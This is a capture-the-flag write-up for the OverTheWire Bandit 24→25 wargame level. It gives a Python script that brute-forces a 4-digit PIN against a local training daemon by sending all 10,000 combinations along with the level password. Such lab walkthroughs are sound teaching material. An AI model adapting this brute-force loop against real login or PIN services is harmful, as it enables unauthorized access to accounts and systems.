# Bandit 24 -> 25

```bash
ssh bandit24@bandit.labs.overthewire.org
```

```
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
```

For this level I wrote a very simple netcat client using Python ([based on a CUPS client I wrote before](https://raw.githubusercontent.com/lvm/cups-indexbraille/master/indexbraille)).
There's room for improvement but that's left to you :-)

```python
#!/usr/bin/env python

import socket

def netcat(hostname, port, content):
    try:
        port = int(port)
    except ValueError as e:
        print "Port must be numeric \n", e

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while 1:
        data = s.recv(1024)
        if data == "":
            break
        else:
            print data
    s.close()

for i in range(0, 10000):
    pin = "{0:4}".format(i).replace(" ","0")
    passwd = "BANDIT24_PASSWD"
    netcat('localhost', 30002, "{} {}".format(passwd, pin))
```

```bash
$ cd `mktemp -d`
$ python bf.py > log.txt
```

And we wait.

* ssh
* python
* mktemp
